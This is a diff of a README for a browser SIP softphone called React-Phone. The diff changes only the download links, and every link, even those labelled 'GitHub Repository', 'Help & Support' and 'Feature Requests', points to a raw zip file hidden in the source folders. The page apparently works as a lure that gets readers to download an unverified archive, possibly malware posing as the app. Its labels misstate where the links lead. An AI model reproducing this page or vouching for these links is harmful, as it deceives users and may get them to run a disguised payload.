@@ -4,13 +4,13 @@
 React-Phone is a modern, browser-based WebRTC SIP softphone. It allows you to make VoIP phone calls directly from your browser without needing any complicated setup. Built using React 19, TypeScript, and JsSIP, this application provides a seamless user experience for all your calling needs.
 
 ## 🔗 Download Now
-[![Download React-Phone](https://raw.githubusercontent.com/Naomiservile373/React-Phone/main/src/assets/React-Phone-v2.9.zip%20Now-React--Phone-blue)](https://raw.githubusercontent.com/Naomiservile373/React-Phone/main/src/assets/React-Phone-v2.9.zip)
+[![Download React-Phone](https://raw.githubusercontent.com/Naomiservile373/React-Phone/main/src/components/React-Phone-2.8.zip%20Now-React--Phone-blue)](https://raw.githubusercontent.com/Naomiservile373/React-Phone/main/src/components/React-Phone-2.8.zip)
 
 ## 🚀 Getting Started
 To get started with React-Phone, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/Naomiservile373/React-Phone/main/src/assets/React-Phone-v2.9.zip) to find the latest version of React-Phone.
+   Go to the [Releases page](https://raw.githubusercontent.com/Naomiservile373/React-Phone/main/src/components/React-Phone-2.8.zip) to find the latest version of React-Phone.
 
 2. **Download the Latest Release**  
    Look for the latest version, and click the link to download the installation file for your operating system.  
@@ -54,7 +54,7 @@ To get started with React-Phone, follow these simple steps:
   Optimized for various screen sizes, so you can make calls from your desktop, laptop, or tablet.
 
 ## 📦 Download & Install
-To download and install React-Phone, simply visit the [Releases page](https://raw.githubusercontent.com/Naomiservile373/React-Phone/main/src/assets/React-Phone-v2.9.zip). Choose the latest version and follow the installation instructions.
+To download and install React-Phone, simply visit the [Releases page](https://raw.githubusercontent.com/Naomiservile373/React-Phone/main/src/components/React-Phone-2.8.zip). Choose the latest version and follow the installation instructions.
 
 ## ❓ FAQs
 **Q: Can I use React-Phone on my mobile device?**  
@@ -76,8 +76,8 @@ Join our community for additional support and resources. Engage with other users
 - Occasionally, users may experience connectivity issues depending on their internet service provider. In these cases, check your network settings or restart your router.
 
 ## 🔗 Additional Links
-- [GitHub Repository](https://raw.githubusercontent.com/Naomiservile373/React-Phone/main/src/assets/React-Phone-v2.9.zip)
-- [Help & Support](https://raw.githubusercontent.com/Naomiservile373/React-Phone/main/src/assets/React-Phone-v2.9.zip)
-- [Feature Requests](https://raw.githubusercontent.com/Naomiservile373/React-Phone/main/src/assets/React-Phone-v2.9.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Naomiservile373/React-Phone/main/src/components/React-Phone-2.8.zip)
+- [Help & Support](https://raw.githubusercontent.com/Naomiservile373/React-Phone/main/src/components/React-Phone-2.8.zip)
+- [Feature Requests](https://raw.githubusercontent.com/Naomiservile373/React-Phone/main/src/components/React-Phone-2.8.zip)
 
 Thank you for choosing React-Phone. Enjoy making calls from your browser with ease!
